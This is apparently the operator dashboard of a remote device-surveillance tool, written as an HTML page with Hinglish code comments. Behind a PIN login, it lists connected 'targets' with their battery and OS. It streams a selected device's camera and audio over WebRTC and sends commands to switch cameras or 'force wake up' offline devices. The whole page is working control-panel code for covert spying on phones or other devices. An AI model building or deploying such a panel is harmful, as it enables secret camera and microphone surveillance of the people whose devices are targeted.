<!DOCTYPE html>
<html>
<head>
    <title>LEO ADMIN - COMMAND HUB PRO</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; --offline: #ff4444; }
        * { box-sizing: border-box; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar with Persistent History */
        .sidebar { width: 300px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; overflow-y: auto; }
        .user-item { background: #112240; padding: 15px; margin: 10px 0; border-radius: 12px; cursor: pointer; border: 2px solid transparent; position: relative; transition: 0.3s; }
        .user-item.active { border-color: var(--blue); box-shadow: 0 0 10px var(--blue); }
        .user-item.online { border-left: 5px solid var(--neon); }
        .user-item.offline { border-left: 5px solid var(--offline); opacity: 0.7; }
        
        .status-tag { font-size: 0.6rem; font-weight: bold; position: absolute; top: 8px; right: 12px; letter-spacing: 1px; }

        /* Main View */
        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .video-box { width: 100%; max-width: 850px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 15px; overflow: hidden; position: relative; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
        video { width: 100%; height: 100%; object-fit: contain; }
        
        /* Command Buttons */
        .controls { margin-top: 20px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; max-width: 550px; }
        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 14px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn:hover { background: var(--blue); color: var(--dark); }
        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; margin-bottom: 5px; font-size: 1rem; box-shadow: 0 0 15px rgba(0,255,157,0.3); }
        
        #login { position: fixed; inset: 0; background: var(--dark); display: flex; align-items: center; justify-content: center; z-index: 100; }
        .info-tag { font-size: 0.7rem; color: #8892b0; margin-top: 5px; }
        .hidden { display: none !important; }
    </style>
    </head>
<body>
    <!-- Login Screen -->
    <div id="login">
        <div style="text-align: center;">
            <h2 style="color: var(--blue); letter-spacing: 2px;">SYSTEM HUB LOGIN</h2>
            <input type="password" id="pin" placeholder="ENTER ACCESS PIN" style="padding:12px; background:#111; color:white; border:1px solid var(--blue); border-radius:8px; width: 250px; text-align: center; outline: none;">
            <br>
            <button onclick="auth()" class="btn" style="margin-top:15px; width:100%;">AUTHORIZE</button>
        </div>
    </div>

    <!-- Persistent Sidebar -->
    <div class="sidebar">
        <h3 style="color: var(--blue); border-bottom: 1px solid #1e3a8a; padding-bottom: 10px;">DEVICES HISTORY</h3>
        <div id="user-list">
            <p style="color: #444; font-size: 0.9rem;">Waiting for devices...</p>
        </div>
    </div>

    <!-- Main Control Area -->
    <div class="main">
        <div style="width: 100%; display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 0.8rem; color: #8892b0; border-bottom: 1px solid #1e3a8a; padding-bottom: 10px;">
            <div>HUB: <span style="color:var(--neon);">ENCRYPTED ONLINE</span></div>
            <div>ACTIVE TARGET: <span id="cur-id" style="color:var(--blue);">NONE</span></div>
        </div>

        <div class="video-box">
            <video id="remoteVideo" autoplay playsinline></video>
            <div id="audio-btn" style="position:absolute; bottom:15px; right:15px; background:rgba(255,0,0,0.8); padding:8px 15px; border-radius:30px; cursor:pointer; font-size: 0.7rem; font-weight: bold; color: #fff;" onclick="unmute()">ðŸ”Š UNMUTE AUDIO</div>
        </div>

        <div class="controls">
            <!-- FORCE WAKE UP: Offline device ko trigger karne ke liye -->
            <button class="btn btn-wake" onclick="sendCommand('wake-up')">âš¡ FORCE WAKE UP / RECONNECT DEVICE</button>
            <button class="btn" onclick="sendCommand('front')">FRONT CAMERA</button>
            <button class="btn" onclick="sendCommand('back')">BACK CAMERA</button>
            <button class="btn" onclick="refreshHub()">REFRESH STREAM</button>
            <button class="btn" style="color:var(--offline); border-color:var(--offline);" onclick="location.reload()">FULL SYSTEM RESET</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentTarget = null, pc;
        let deviceHistory = {}; // Local storage for this session
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        function auth() { socket.emit('admin-join', document.getElementById('pin').value); }
        socket.on('admin-status', (r) => { if(r.success) document.getElementById('login').classList.add('hidden'); else alert("PIN INCORRECT"); });

        // Logic: Online devices update karo aur Offline ko history mein rakho
        socket.on('update-targets', (activeList) => {
            // Pehle sabko offline mark karo
            for (let id in deviceHistory) { deviceHistory[id].status = 'offline'; }

            // Jo active hain unhe online karo
            activeList.forEach(target => {
                deviceHistory[target.id] = {
                    id: target.id,
                    battery: target.battery,
                    device: target.device,
                    status: 'online'
                };
            });
            renderUI();
        });

        function renderUI() {
            const listDiv = document.getElementById('user-list');
            listDiv.innerHTML = "";
            
            // Sort: Online devices upar aayenge
        const ids = Object.keys(deviceHistory).sort((a,b) => (deviceHistory[b].status === 'online') - (deviceHistory[a].status === 'online'));

            ids.forEach(id => {
                const dev = deviceHistory[id];
                const d = document.createElement('div');
                d.className = `user-item ${currentTarget === id ? 'active' : ''} ${dev.status}`;
                d.innerHTML = `
                    <span class="status-tag" style="color:${dev.status==='online'?'var(--neon)':'var(--offline)'}">
                        ${dev.status.toUpperCase()}
                    </span>
                    <strong>Device_${id.substring(0,4)}</strong>
                    <div class="info-tag">OS: ${dev.device} | Bat: ${dev.battery}</div>
                `;
                d.onclick = () => {
                    currentTarget = id;
                    document.getElementById('cur-id').innerText = id.substring(0,8);
                    renderUI(); // Refresh active state
                    if(dev.status === 'online') select(id);
                };
                listDiv.appendChild(d);
            });
        }

        function unmute() { 
            const v = document.getElementById('remoteVideo'); 
            v.muted = false; 
            v.play().catch(e => {}); 
            document.getElementById('audio-btn').classList.add('hidden'); 
        }

        function refreshHub() { if(currentTarget && deviceHistory[currentTarget].status === 'online') select(currentTarget); }

        async function select(id) {
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: id, signal: { candidate: e.candidate } }); };
            pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            socket.emit('command', { targetId: id, cmd: 'start' });
        }

        socket.on('signal', async (d) => {
            if(d.from !== currentTarget) return;
            if(d.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
                if(d.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                }
            } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
        });

        function sendCommand(c) { 
            if(!currentTarget) return alert("PLEASE SELECT A DEVICE FROM HISTORY!");
            socket.emit('command', { targetId: currentTarget, cmd: c }); 
        }
    </script>
</body>
</html>
